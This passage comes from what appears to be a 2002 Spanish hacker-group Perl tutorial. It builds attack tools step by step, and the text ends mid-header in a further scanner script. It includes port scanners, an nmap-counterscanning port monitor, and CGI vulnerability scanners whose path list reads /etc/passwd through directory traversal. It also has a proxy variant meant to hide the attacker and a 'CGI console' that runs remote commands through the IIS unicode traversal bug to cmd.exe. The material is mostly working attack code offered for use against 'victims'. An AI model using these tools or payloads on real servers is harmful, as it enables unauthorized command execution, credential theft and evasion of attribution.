  nmap>>, nos mandara ip, hora y fecha del atacante,  el  sistema  que  esta
  utilizando y el tambien se llevara una escaneada por parte nuestra xDDD.


<++> disidentsportm.pl


#!/usr/bin/perl
###################################################################################################################
# PROGRAMA: Disidentsportmonitor v1.1 ATTACK and SEND                                                             #
# AUTOR:    DDiego                                                                                                #
# MAIL:     DDiegodisid@yahoo.es                                                                                  #
# URL:      http:www.disidents.int-ltd.com                                                                        #
# MAILTEAM: Disidents@yahoo.es                                                                                    #
# Uso:      disidentsportm.pl [puerto] [+nmap | -nmap] [+mail | - mail] [mail a enviar] [servidor stmp] [+d | -d] #
###################################################################################################################

use IO::Socket;
use IO::Select;  #Cargamos el modulo IO::Select
use Net::SMTP;   #Modulo que necesitamos para avisar por mail al admin

die "sintaxis: $0 [puerto] [+nmap | -nmap] [+mail | - mail] [mail a enviar] [servidor stmp] [+d | -d]
Escribe $0 --help para mas ayuda\n" unless ($ARGV[0]);

$puerto=$ARGV[0];
$nmap=$ARGV[1];
$usarmail=$ARGV[2];
$mimail=$ARGV[3];
$servsmtp=$ARGV[4];
$debugmode=$ARGV[5];

if ($puerto eq "--help") {  #Si el primer argumento fuera ayuda
                          &ayuda;
                         }
                         else {

$socket = IO::Socket::INET->new( Proto     => 'tcp',
                                 LocalPort => "$puerto",
                                 Listen    => 6,
                                 Reuse     => 1);

        die "No se ha podido crear el socket" unless $socket;

        print " ################################################################### \n";
        print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
        print " #    ø   DisidentsPortMonitor v1.1  Attack and Send by DDiego  ø  # \n";
        print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
        print " ################################################################### \n\n";

        $select = new IO::Select( $socket );
         while (@ready = $select->can_read ) {
                   foreach $conexion (@ready) {
                      if($conexion == $socket) {

         while ($nuevosocket = $socket->accept()) {   #Ahora crearemos el socket nuevo
                  $select->add($nuevosocket); #añade el nuevo socket abierto
                  $nuevosocket->autoflush(1); #autoflush sirve para crear un buffer temporal que se vacia
                                              #de forma periodica se le da un valor  distinto de 0 que
                                              #significa q se vaciara de forma automatica



         print "Conexion desde: ",inet_ntoa((unpack_sockaddr_in(getpeername $nuevosocket))[1])," \n"; #Sacamos la ip de quien conecto
         $servidor=inet_ntoa((unpack_sockaddr_in(getpeername $nuevosocket))[1]); #Guardamos la ip en una variable
         $hora=localtime();   #lo mismo con la hora
         print  "=> $hora\n"; #Imprime la hora en pantalla


         if ($nmap eq "+nmap") {
                                &nmap;
                               } elsif ($nmap eq "-nmap") {
                                                             print "NMAP OPCION DISABLED\n";
                                                           }
         if ($usarmail eq "+mail") {
                                    &avisar;

                                    if ($debugmode eq "+d") {
                                                             $debug=1;
                                                            }
                                                            else {
                                                                   $debug=0;
                                                                 }

                                    } elsif ($usarmail eq "-mail"){
                                                                   print "MAIL OPCION DISABLED\n";
                                                                  }
  ###################
  #Parte de la ayuda#
  ###################

         sub ayuda {
                     print "[puerto]:         nº de puerto a monitorizar\n";
                     print "[+nmap | -nmap]:  Usar scanner nmap, si no lo tienes no lo uses, esta puesto en modo SYN Sealth, este \n";
                     print "                  modo de escaneo solo funciona como superusuario, pero puedes cambiar los parametros,\n";
                     print "                  lee el code es facil y esta comentado \n";
                     print "[+mail | -mail]:  Habilita o deshabilita el modo de aviso por mail\n";
                     print "[mail a enviar]:  Mail a donde vas a enviar el aviso\n";
                     print "[servidor stmp]:  Servidor de envio de mail smtp que usas ej: smtp.terra.es smtp.wanadoo.es etc ....   \n";
                     print "[+d | -d]:        Habilita o deshabilita el modo de depuracion, para ver como envia el mail, y ver si  \n";
                     print "                  los parametros que has introducido son correctos\n";
                     }




  ##########################################################
  #Parte de scaneo con nmap, en win se puede usar el winmap#
  ##########################################################

         sub nmap {

         $remoteos= `nmap -sS -O  $servidor`;  #podeis poner el escaneo con nmap a vuestro gusto
         print "$remoteos\n";  #imprime el host remoto en la pantalla

                   }



  ##########################
  #Parte del mail  de aviso#
  ##########################

         sub avisar {

         $smtp = Net::SMTP->new($servsmtp,   #creamos el nuevo objeto smtp, servidor smtp pon el que utilices
                                Hello => $servsmtp,  #Algunos servidores necesitan que les saludes
                                Timeout=> 25,#Tiempo maximo de espera para que te responda el server por defecto 120
                                Debug   => $debugmode, #Habilita el modo debug si quieres ver como envia
                                );

         die "No se ha podido conectar al servidor $servidorSMTP" unless $smtp;
         print "Enviando mensaje\n";
         $smtp->mail("aviso\@yahoo.es"); #el mail con que voy a mandar
         $smtp->to($mimail);    #mail a quien mandas al mio no please
         $smtp->data();  #comienza el mensaje
         $smtp->datasend("To:  $mimail\n");
         $smtp->datasend("From:aviso\@yahoo.es\n");
         $smtp->datasend("Subject:Escaneo\n"); #asunto
         $smtp->datasend("Conexion con ip: $servidor a $hora \n"); #Mandamos este mensaje
         $smtp->datasend("Sistema operativo del atacante: $remoteos  \n"); #Mandamos este mensaje
         $smtp->dataend();  #termina el mensaje
         $smtp->quit();#nos piramos
         print "Mensaje enviado\n";
         }#cierre subrutina


         close $nuevosocket;

    }
   }
  }
 }
}



<-->












.==========================================================================.
|=======~ 38.0.0 CREANDO NUESTRO PROPIO SCANNER DE PUERTOS ~================
|===========================================================================


- Como es eso que usas scanners hechos por otros???, eso ya se acabo,en esta
  parte vamos a usar modulos o librerias de perl CPAN y crearemos un scanner
  de puertos en pocas lineas y de manera facil y eficad, para encontrar  los
  modulos de perl recordemos que tenemos que ir a (http://www.perl.com/cpan)
  o a (http://www.cpan.org), para  llamar a estos modulos  usaremos:
  use nombredelmodulo, en este caso usaremos el modulo  IO::Socket y lo  de-
  clararemos asi al inicio del script:  "use IO::Socket;"   tenemos la ayuda
  para este modulo en (http://search.cpan.org/doc/JHI/perl-5.7.2/ext/IO/lib/
  IO/Socket.pm) y  (http://search.cpan.org/doc/JHI/perl-5.7.2/ext/IO/lib/IO/
  Socket/INET.pm), veamos el codigo comentado:


  Ejemplo:

   #!/usr/bin/perl
   use IO::Socket;  #cargamos el modulo IO::Socket
   print "------------------------------------------------\n";
   print "-            Disidentscanner by DDiego         -\n";
   print "------------------------------------------------\n";
   print "-            D  I  S  I  D  E  N  T  S         -\n";
   print "-        L O S  F U E R A  D E  L A  L E Y     -\n";
   print "------------------------------------------------\n";
   print "- Nombre del server a atacar: ";
   $servidor=<STDIN>;  #Se introduce la ip del servidor
   print "- Puerto inicio de escaneo: ";
   $pinicio=<STDIN>;   #Se introduce el puerto de inicio del escaneo
   print "- Puerto final de escaneo:  ";
   $pfinal=<STDIN>;    #Se introduce el puerto final del escaneo

   for ($pabiertos=$pinicio;$pabiertos<=$pfinal;$pabiertos++) #Un bucle for, para escanear
                                                           #el rango de puertos introducido
     {
     $sock = IO::Socket::INET->new(PeerAddr, "$servidor", PeerPort, "$pabiertos",  Proto, 'tcp');

     #PeerAddr es el servidor que vamos a escanear
     #PeerPort son los puertos
     #Proto es el protocolo que utiliza

     if ($sock) {    #si conecta imprimira lo siguiente los puertos que estan abiertos
                print "------------------------------------------------\n";
                print "-          PUERTO: $pabiertos ABIERTO                  -\n";
                print "------------------------------------------------\n";
                           }
                            else {  #Si no conecta imprimira los puertos cerrados
                            print "$pabiertos chapao\n";
                           }
     }




  SALIDA:

   [root@localhost arti]# perl disidentscanner.pl
   ------------------------------------------------
   -            Disidentscanner by DDiego         -
   ------------------------------------------------
   -            D  I  S  I  D  E  N  T  S         -
   -        L O S  F U E R A  D E  L A  L E Y     -
   ------------------------------------------------
   - Nombre del server a atacar: 192.168.0.1
   - Puerto inicio de escaneo: 50
   - Puerto final de escaneo:  60
   50
   chapao
   51 chapao
   52 chapao
   ------------------------------------------------
   -          PUERTO: 53 ABIERTO                  -
   ------------------------------------------------
   54 chapao
   55 chapao
   56 chapao
   57 chapao
   58 chapao
   59 chapao
   60 chapao
   [root@localhost arti]#



- En la linea 15  podrian verse de otra  forma mas clara, en vez  usar comas
  usar =>

$sock = IO::Socket::INET->new(PeerAddr, "$servidor", PeerPort, "$pabiertos",  Proto, 'tcp');


* Asi:

$sock = IO::Socket::INET->new(PeerAddr => $servidor, PeerPort => $pabiertos, Proto => 'tcp');







- Podemos hacer que nuestro scanner sea mas comodo de usar, con 3 argumentos
  , quedaria algo asi:


 Ejemplo:

  #!/usr/bin/perl
  use IO::Socket;  #cargamos el modulo IO::Socket
  die "sintaxis: disidentscanner.pl <ip> <puertodeinicio> <puertofinal>\n" unless ($ARGV[2]);
  #si no mete los dos argumentos imprmira la sintaxis del programa
  print "------------------------------------------------\n";
  print "-            Disidentscanner by DDiego         -\n";
  print "------------------------------------------------\n";
  print "-            D  I  S  I  D  E  N  T  S         -\n";
  print "-        L O S  F U E R A  D E  L A  L E Y     -\n";
  print "------------------------------------------------\n";
  for ($pabiertos=$ARGV[1];$pabiertos<=$ARGV[2];$pabiertos++)
       {
       $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0], #La ip sera el primer argumento
                                     PeerPort => "$pabiertos",
                                     Proto    => 'tcp');


                  if ($sock)   {               #si conecta imprimir
                  print "- PUERTO: $pabiertos ABIERTO\n";

                               }
        } #Cierre de for









.==========================================================================.
|===~ 38.1.0  CREANDO UN SCANNER DE PUERTOS CON OPCION DE ESCANEAR RANGOS ~=
|===========================================================================


-  Umm y se nos viene a la mente muchas cosas acabando de hacer nuestro pri-
   mer scanner de puertos,entre otras como haremos para poder scannear puer-
   tos, es muy faciilllllllllllll (claro como todo cuando lo sabes).


- Lo primero que vamos a hacer es quitar los puntos de la ip, imaginemos que
  tenemos la ip 192.168.0.1 y la dejamos  como 192 168 0 1, como  vimos  mas
  arriba  en el  ejemplo de  split ,  supongamos  que queremos  escanear  de
  192.168.0.1 a 192.168.0.150 ,las dividiriamos y quedarian como 192 168 0 1
  y 192 168 0 150 ,  ahora  solo tendriamos  que ir de  1 a 150, veamos code
  comentado:


 #!/usr/bin/perl
 $ip1=$ARGV[0]; #meteriamos como argumento 192.168.0.1
 $ip2=$ARGV[1]; #meteriamos como argumento 192.168.0.140
 @ipini = split(/\./,$ip1);#sustituye el punto por espacios
 @ipfin = split(/\./,$ip2);#sustituye el punto por espacios
 print "@ipini\n";    #imprimira 192 168 0 1
 print "@ipini[3]\n"; #imprimira 1
 print "@ipfin\n";    #imprimira 192 168 0 140
 print "@ipfin[3]\n"; #imprimira 140

- Veis ahora podemos acceder a cada uno de los elementos,el motor del scaner
  quedaria asi:


 Ejemplo:

 #!/usr/bin/perl
 use IO::Socket;

 $port=80; #numero de puerto
 $ip1=$ARGV[0];
 $ip2=$ARGV[1];
 @ipini = split(/\./,$ip1);#sustituye el punto por espacios
 @ipfin = split(/\./,$ip2);#sustituye el punto por espacios
 for ($rango=$ipini[3];$rango<=$ipfin[3];$rango++)
 {

 $ipscan="$ipini[0].$ipini[1].$ipini[2].$rango";#aqui creamos las ips que vamos a scanear
 #print "$ipscan\n";
 $sock = IO::Socket::INET->new(PeerAddr => $ipscan, #La ip sera el primer argumento
                               PeerPort => "$port",
                               Proto    => 'tcp');


                if ($sock)   {               #si conecta imprimir
                print "- PUERTO: $ips $port ABIERTO\n";

                             }   else { print "$ips $port close\n"; }


* Biennnnnnn lo hemos conseguido, vamos a dejarlo mas guapo ;D


<++> disidentscanner.pl

#!/usr/bin/perl
###############################################################################################
# PROGRAMA: Disidentscanner v.1.0 DualMode                                                    #
# AUTOR:    DDiego                                                                            #                                      #
# MAIL:     DDiegodisid@yahoo.es                                                              #                                      #
# URL:      http:www.disidents.int-ltd.com                                                    #                                      #
# MAILTEAM: Disidents@yahoo.es                                                                #                                      #
# Uso modo single:  disidentscanner.pl [single] [ip] [puerto de inicio] [puerto final]        #
# Uso modo range:   disidentscanner.pl [range]  [ip de inicio] [ip final] [puerto]            #
###############################################################################################
use IO::Socket;

$metodo=$ARGV[0]; #Tipo de metodo por rangos o solo una ip
&inicio;
die "sintaxis: $0 [range | single]
Escriba $0 help_single para obtener mas ayuda para el escaneo de un solo host
Escriba $0 help_range para obtener mas ayuda para el escaneo de un rango de ips\n" unless ($ARGV[0]);

if ($metodo eq "single")       {
                                 &single;
                                }

if ($metodo eq "range")        {
                                 &range;
                                }

if ($ARGV[0] eq "help_single")  {
                                 &ayudasingle;
                                }


if ($ARGV[0] eq "help_range")  {
                                &ayudarange
                                }

sub single {

                $victima=$ARGV[1]; #ip victima
                $portini=$ARGV[2]; #puerto de inicio
                $portfin=$ARGV[3]; #puerto final

                if ($portini>$portfin) {
                                         print "El puerto de inicio $portini no puede ser mayor que el puerto final $portfin\n";
                                         exit;
                                        }
                die "sintaxis: $0 [single] [host o ip] [puerto de inicio] [puerto final]\n" unless ($ARGV[3]);
                for ($pabiertos=$portini;$pabiertos<=$portfin;$pabiertos++)
                 {
                     $sock = IO::Socket::INET->new(PeerAddr => $victima, #La ip sera el primer argumento
                                                   PeerPort => "$pabiertos",
                                                   Proto    => 'tcp');


                                if ($sock)   {               #si conecta imprimir
                                print "- PUERTO: $pabiertos ABIERTO\n";

                                             }
              } #Cierre de for
             }#cierre subrutina single


sub range {
                $ip1=$ARGV[1];
                $ip2=$ARGV[2];
                $port=$ARGV[3];

                die "sintaxis: $0 [range] [ip de inicio] [ip final] [puerto]\n" unless ($ARGV[3]);

                @ipini = split(/\./,$ip1);#sustituye el punto por espacios
                @ipfin = split(/\./,$ip2);#sustituye el punto por espacios

                if ($ipini[3]>255 | $ipfin[3]>255){
                                     print "El rango de ips tiene que estar entre 1 y 255 $ipfin no es posible\n";
                                     exit;
                                    }
                elsif ($ipini[3]>$ipfin[3]) {
                                              print "La ip de inicio no puede ser mayor que la ip final introduzca bien los parametros\n";
                                              exit;
                                            }
                  for ($rango=$ipini[3];$rango<=$ipfin[3];$rango++) {
                    $ipscan="$ipini[0].$ipini[1].$ipini[2].$rango"; #preparamos las ip
                       $sock = IO::Socket::INET->new(PeerAddr => $ipscan, #La ip sera el primer argumento
                                                    PeerPort => "$port",
                                                    Proto    => 'tcp');


                if ($sock)   {
                                print "$ipscan - $port ABIERTO\n";    #si conecta imprimir
                             }
                                                                   }#cierre de for
            } #cierre subrutina range


sub inicio {

        print " ################################################################### \n";
        print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
        print " #    ø         Disidentscanner v.1.0 DualMode by DDiego        ø  # \n";
        print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
        print " ################################################################### \n\n";

           }


   ##################
   # Parte de ayuda #
   ##################


sub ayudasingle {
                   print "[single]:          Parametro para usar el modo de escaneo a una sola ip\n";
                   print "[ip o host]:       ip de la victima\n";
                   print "[puerto de inicio]:Puerto de inicio del escaneo\n";
                   print "[puerto final]:    Puerto final del escaneo\n";
                 }

sub ayudarange    {
                    print "[range]:        Parametro para usar el modo de escaneo de varias ip\n";
                    print "[ip de inicio]: Direccion ip de inicio\n";
                    print "[ip final]:     Direccion ip final\n";
                    print "[puerto]:       Puerto\n";
                  }



print "                                                              ------------------------------------------------\n";
print "                                                             - Disidents Hacker Team - 2002                 -\n";
print "                                                             - Webpage:  http://www.disidents.int-ltd.com   -\n";
print "                                                             - Autor:    DDiego                             -\n";
print "                                                             - Mail:     DDiegodisid\@yahoo.es              -\n";
print "                                                             - Mailteam: Disidents\@yahoo.es                -\n";
print "                                                             ------------------------------------------------\n";



<-->

Good








.==========================================================================.
|=======~ 39.0.0 CREANDO  UNA CONSOLA PARA CGIS ~===========================
|===========================================================================


- Y quien no ha visto alguna consola de estas que circulan por internet,  en
  manos de cualquier script kiddie,  buscando servers vulnerables  como unos
  posesos y creyendose dioses por ello, pero nosotros somos nobles artesanos
  que con nuestras manos y mentes contruimos todas las herramientas que que-
  ramos facilmente a nuestro gusto, mejores o peores pero son nuestras ;).
  Para ello usaremos el modulo LWP::Simple este modulo permite descargar,ver
  y analizar paginas web facilmente, veamos code comentado.


- LWP::Simple no tiene muchas opciones, veamos alguna de ellas:

  Ejemplo:

   #!/usr/bin/perl
   use LWP::Simple;
   $page = get "http://192.168.0.1";
   print "$page\n";


* Ahora imprimira la pagina principal del servidor, pero hay un problema que
  si pusieramos:

  Ejemplo:

   #!/usr/bin/perl
   use LWP::Simple;
   $page = getprint "http://localhost/gsfdg";
   print "$page\n";



* No saldria nada, por eso vamos a usar getprint que funciona = pero nos  da
  respuesta si encuentra o no la  pagina web, probemoslo:


  Ejemplo:
   #!/usr/bin/perl
   use LWP::Simple;
   $page = getprint "http://localhost/gsfdg";
   print "$page\n";



  SALIDA:

   [root@localhost scancgis]# perl getprint.pl
   404 Not Found <URL:http://localhost/gsfdg>
   404



* Claro la pagina no existe, ahora veremos como se hace la consola facilmete


<++> disidentsconsola.pl

#!/usr/bin/perl
########################################################
# PROGRAMA: DisidentsConsola v. 1.0                    #
# AUTOR:    DDiego                                     #
# MAIL:     DDiegodisid@yahoo.es                       #
# URL:      http:www.disidents.int-ltd.com             #
# MAILTEAM: Disisidents@yahoo.es                       #
# Sintaxis: disidentsconsola.pl [ip/host del servidor] #
########################################################
use LWP::Simple; #Modulo que vamos a necesitar
die "sintaxis: $0 [ip/host del servidor]\n" unless ($ARGV[0]); #Si no metes la ip te imprime el mensaje de la sintaxis
$server=$ARGV[0];   #Un argumento para la linea de comandos host o ip del server
print " ############################################### \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " #    ø   DisidentsConsola v.1.0 by DDiego  ø  # \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " ############################################### \n";

while (1) {
print "Disidentsconsola: ";
$comando= <STDIN>;         #Recogemos el momando
chop $comando;     #Quita el enter
if ($comando =~ s/ /+/g) #Sustituye los espacios por +
                       {
                       print "$comando\n"; #Imprime el comando introducido
                       $page = getprint "http://$server/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+$comando";
                        print "$page\n"; #imprime la pagina de arriba con el comando intrucido y los espacios separado por +
                       }

else { print "El comando introducido no es correcto\n";}

           }



<-->


- NOTA: e puesto el bug cgi de unicode clasica pero eso podreis cambiarlo  a
  vuestro gusto ;).













.==========================================================================.
|=======~ 40.0.0 CREANDO UN SCANNER DE CGIS ~===============================
|===========================================================================


- Diossssss ya tenemos una consola, ahora se nos apetece hacer un scanner de
  vulnerabilidades de cgis, puesssssssss  ya  esta  seguiremos con el modulo
  LWP::Simple y ademas u saremos LWP::UserAgent, naaa para ver la  respuesta
  del servidor.


- Umm estaba  bien que  nuestro scanner al conectar  sacara informacion  del
  server, veamos un ejemplo:

  Ejemplo:

   #!/usr/bin/perl
   use LWP::Simple;
   $url="http://127.0.0.1";

   ($content_type, $document_length, $modified_time, $expires, $server) = head($url);  #head tiene 5 valores asociados
     print "Content-type:   $content_type   \n";
     print "Document-Length:$document_length\n";
     print "Modified-Time:  $modified_time  \n";
     print "Expires:        $expires        \n";
     print "Server:         $server         \n";



  SALIDA:

   [root@localhost final]# ./head.pl
   Content-type:   text/html
   Document-Length:
   Modified-Time:
   Expires:
   Server:         Apache-AdvancedExtranetServer/1.3.19 (Linux-Mandrake/3mdk)


* Interesante para nuestro scanner no??

- jeje


- Ahora otra cosa interesante seria obtener el codigo de estado de respuesta
  del server, pero en forma de numero , si la respuesta que nos da el server
  es 200 es que la pagina, archivo o imagen ha sido encontrado, tambien esta
  el 404  que sale cuando no se  encuentra  el  archivo o  documento  en  el
  servidor, y la  500 indica que el server no tira.



- Veamos como se utiliza, esto va a ser el motor de nuestro scanner, vamos a
  usar el modulo LWP::UserAgent :


  Ejemplo:

   #!/usr/bin/perl
   use LWP::Simple;
   use LWP::UserAgent;
   $url="http://127.0.0.1";
   @cgis=("no_existe.html","no_existe.html","index.shtml","no_existe.html");


   foreach $cgi (@cgis) {    #vamos a ordenarlos
                           $urlcgi="$url/$cgi";#formamos la direccion completa
                           $ua = LWP::UserAgent->new();
                           $request = HTTP::Request->new('HEAD', $urlcgi);
                           $response = $ua->request($request);
                           if ($response->code == 200) {  #si la respuesta es 200 el server es vulnerable
                                                        print "$urlcgi -> vulnerable code:", $response-> code,"\n";
                                                       }
                          else { print "$urlcgi -> no vulnerable code:", $response->code,"\n";} #si no el server no es vulenrable

                         }






  SALIDA:

   [root@localhost final]# perl scancgi.pl
   http://127.0.0.1/no_existe.html -> no vulnerable code:404
   http://127.0.0.1/no_existe.html -> no vulnerable code:404
   http://127.0.0.1/index.shtml -> vulnerable code:200    <-- es la unica pagina que existe
   http://127.0.0.1/no_existe.html -> no vulnerable  code:404


- biennnnnn, veamos como quedaria un scanner de cgis, un poco mas formal


<++> disidentscgi.pl

#!/usr/bin/perl
########################################################################################################
# PROGRAMA: DisidentsCGIScanner v1.0                                                                   #
# AUTOR:    DDiego                                                                                     #
# MAIL:     DDiegodisid@yahoo.es                                                                       #
# URL:      http:www.disidents.int-ltd.com                                                             #
# MAILTEAM: Disisidents@yahoo.es                                                                       #
# Sintaxis: disidentscgi.pl [ip/host del servidor] [lista cgis] [+v|-v] (ver todas las respuestas o no)#
# Example:  ./disidentscgiscan.pl localhost listacgis.txt +v                                           #
########################################################################################################
use LWP::Simple;
use LWP::UserAgent;


die "sintaxis: $0 [ip/host del servidor] [lista cgis] [+v|-v]
Escriba $0 --help para ver la ayuda\n" unless ($ARGV[0]);
$url=$ARGV[0];   #Un argumento para  host o ip del server

if ($ARGV[0] eq "--help"){
                          &ayuda;
                         } else {

require $ARGV[1];   #Un argumento para la lista de cgis vulnerables

print " ################################################## \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " #    ø   DisidentsCGIScanner v.1.0 by DDiego  ø  # \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " ################################################## \n\n";

$urlformada="http://$ARGV[0]";
($content_type, $document_length, $modified_time, $expires, $server) = head($urlformada);
  print "TIPO DE SERVIDOR: $server\n\n";

print "Escaneando CGIS\n";


        $urlcgi="http://$url";
        $ua = LWP::UserAgent->new();
        $ua->agent('Disidents navigator'); #Tipo de navegador que usamos xDDD
        $request = HTTP::Request->new('HEAD', $urlcgi);
        $response = $ua->request($request);

        if ($response->code == 500) {
                                     print "$urlcgi direccion desconocida\n";
                             }



        elsif ($ARGV[2] eq "+v")   {
                                  &vertodo;
                                }

        elsif($ARGV[2] eq "-v") {
                                  &vervulnerables;
                                }

        sub vertodo {
           foreach $cgi (@cgis) {
                        $urlcgi="http://$url/$cgi";
                        $ua = LWP::UserAgent->new();
                        $ua->agent('Disidents navigator');
                        $request = HTTP::Request->new('HEAD', $urlcgi);
                        $response = $ua->request($request);
                        if ($response->code == 200) {
                                                     print "$urlcgi    OK\n";
                                                    }
                        else { print "$urlcgi NOT\n";}
                        }
                      }


        sub vervulnerables {
             foreach $cgi (@cgis) {
                                $urlcgi="http://$url/$cgi";
                                $ua = LWP::UserAgent->new();
                                $ua->agent('Disidents navigator');
                                $request = HTTP::Request->new('HEAD', $urlcgi);
                                $response = $ua->request($request);
                                if ($response->code == 200) {
                                                             print "$urlcgi    OK  \n";
                                                            }
                                }


        print "Escaneo finalizado\n\n\n";

        }
       }

 #####################
 # Parte de la ayuda #
 #####################

 sub ayuda {
            print "[ip/host del servidor]: Host o ip del server sin las http \n";
            print "[lista cgis]:           listascgis.txt, puedes incluir mas cgis a tu gusto\n";
            print "[+v|-v]:                Modo verbose, imprime todos los resultados ya sean fallidos o no con +v\n";
            print "                        que encuentre vulnerables\n";
            print "Ejemplo:                ./disidentscgiscanvp.pl 255.255.255.255 listacgis.txt +v\n\n\n";
           }



print "                                                             ------------------------------------------------\n";
print "                                                             - Disidents Hacker Team - 2002                 -\n";
print "                                                             - Webpage:  http://www.disidents.int-ltd.com   -\n";
print "                                                             - Autor:    DDiego                             -\n";
print "                                                             - Mail:     DDiegodisid\@yahoo.es              -\n";
print "                                                             - Mailteam: Disidents\@yahoo.es                -\n";
print "                                                             ------------------------------------------------\n";



<-->


- guapoooo ehhhh, good ya tenemos nuestro scanner de cgis, ahora veamos como
  tiene que ser el archivo de la lista, seria un array, asi:


   @cgis=("....../autoexec.bat",
          "....../etc/master.passwd",
          "....../etc/passwd"); #Este es un ejemplo en pequeño, en la pagina
                                #del grupo hay una lista de mas de 1400
                                #vulnerabilidades

- Consejos para la lista, pues te pueden fallar los @ ya sabes ponle una ba-
  rra delante \ , y tambien te puede dar error en cgis que pongas C:\ con la
  \, tendras que poner C:\\












.==========================================================================.
|=======~ 40.1.0 CREANDO UN SCANNER DE CGIS CON SOPORTE PARA USA UN PROXY ~=
|===========================================================================


- Buff que putada, que nuestro scanner de cgis scanee a pelo, pero noooooooo
  locos porque el señor DDiego va a enseñaros como vuestro scanner va  a po-
  der usar un proxy tranquilamente, buff que suerte que  tengais este manual
  y que yo este tan pasao de escribirlo xDDDDDDDD, solo con una linea ya po-
  demos usar un proxy veamos un ejemplo:


* Solo tenemos que añadir la linea:   $ua->proxy(['http'], 'http://ipdelproxy:80/');
  y ya esta, veamos como quedaria:


 <++> disidentscgiscanvp.pl

#!/usr/bin/perl
#####################################################################################################################################
# PROGRAMA: DisidentsCGIScanner v1.1 Proxy Version                                                                                  #
# AUTOR:    DDiego                                                                                                                  #
# MAIL:     DDiegodisid@yahoo.es                                                                                                    #
# URL:      http:www.disidents.int-ltd.com                                                                                          #
# MAILTEAM: Disisidents@yahoo.es                                                                                                    #
# Sintaxis: disidentscgiscanvp.pl [ip/host del servidor] [lista cgis] [+v|-v] (ver todas las respuestas o no) [ip del proxy:puerto] #
# Example:  ./disidentscgiscanvp.pl 255.255.255.255 listacgis.txt +v  255.255.255.255:80                                            #
#####################################################################################################################################
use LWP::Simple;
use LWP::UserAgent;


die "sintaxis: $0 [ip/host del servidor] [lista cgis] [+v|-v] [ip del proxy:puerto]
Escriba $0 --help para ver la ayuda\n" unless ($ARGV[0]);

$url=$ARGV[0];   #Un argumento para  host o ip del server
if ($ARGV[0] eq "--help"){
                          &ayuda;
                         } else {

require $ARGV[1];   #Un argumento para la lista de cgis vulnerables



print " ################################################################ \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " #    ø   DisidentsCGIScanner v.1.1 Proxy Version by DDiego  ø  # \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " ################################################################ \n\n";

$urlformada="http://$ARGV[0]"; #Aqui no usamos proxy pero tampoco hacemos nada malo
($content_type, $document_length, $modified_time, $expires, $server) = head($urlformada);
  print "TIPO DE SERVIDOR: $server\n\n";

print "Escaneando CGIS\n";
        $lista="$ARGV[2]";
        $proxy="$ARGV[3]";
        $urlcgi="http://$url";
        $ua = LWP::UserAgent->new();
        $ua->agent('Disidents navigator'); #Tipo de navegador que usamos
        $ua->proxy(['http'], "http://$proxy"); #Proteccion del proxy ;D, aqui si lo necesitamos
        $request = HTTP::Request->new('HEAD', $urlcgi);
        $response = $ua->request($request);

        if ($response->code == 500) {
                                     print "$urlcgi direccion desconocida\n";
                                    }



        elsif ($lista eq "+v")  {
                                  &vertodo;
                                }

        elsif($lista eq "-v")   {
                                  &vervulnerables;
                                }

        sub vertodo {
           foreach $cgi (@cgis) {
                        $urlcgi="http://$url/$cgi";
                        $ua = LWP::UserAgent->new();
                        $ua->agent('Disidents navigator');
                        $ua->proxy(['http'], "http://$proxy"); #a protegernos el culo
                        $request = HTTP::Request->new('HEAD', $urlcgi);
                        $response = $ua->request($request);
                        if ($response->code == 200) {
                                                     print "$urlcgi    OK\n";
                                                    }
                        else { print "$urlcgi NOT\n";}
                        }
                      }


        sub vervulnerables {
             foreach $cgi (@cgis) {
                                $urlcgi="http://$url/$cgi";
                                $ua = LWP::UserAgent->new();
                                $ua->agent('Disidents navigator');
                                $ua->proxy(['http'], "http://$proxy"); #vivan los proxies
                                $request = HTTP::Request->new('HEAD', $urlcgi);
                                $response = $ua->request($request);
                                if ($response->code == 200) {
                                                             print "$urlcgi    OK  \n";
                                                            }
                                }


        print "Escaneo finalizado\n\n\n";

        }
       }


 #####################
 # Parte de la ayuda #
 #####################

 sub ayuda {
            print "[ip/host del servidor]: Host o ip del server sin las http \n";
            print "[lista cgis]:           listascgis.txt, puedes incluir mas cgis a tu gusto\n";
            print "[+v|-v]:                Modo verbose, imprime todos los resultados ya sean fallidos o no con +v\n";
            print "                        que encuentre vulnerables\n";
            print "[ip del proxy:puerto]:  Proxy y puerto sin las http, tipo 255.255.255.255:80\n";
            print "Ejemplo:                ./disidentscgiscanvp.pl 255.255.255.255 listacgis.txt +v  255.255.255.255:80\n\n\n";
           }

print "                                                              ------------------------------------------------\n";
print "                                                             - Disidents Hacker Team - 2002                 -\n";
print "                                                             - Webpage:  http://www.disidents.int-ltd.com   -\n";
print "                                                             - Autor:    DDiego                             -\n";
print "                                                             - Mail:     DDiegodisid\@yahoo.es              -\n";
print "                                                             - Mailteam: Disidents\@yahoo.es                -\n";
print "                                                             ------------------------------------------------\n";


 <-->

+ mas guapoooo  todavia ;D



- Joder vemos un problema que no deja  opcion de hacerlo sin proxy,  hagamos
  unos ajustes entre argumento y argumento:




 <++> disidentscgiscanrvp.pl



#!/usr/bin/perl
########################################################################################################################################
# PROGRAMA: DisidentsCGIScanner Range v1.2 Proxy Version                                                                               #
# AUTOR:    DDiego                                                                                                                     #
# MAIL:     DDiegodisid@yahoo.es                                                                                                       #
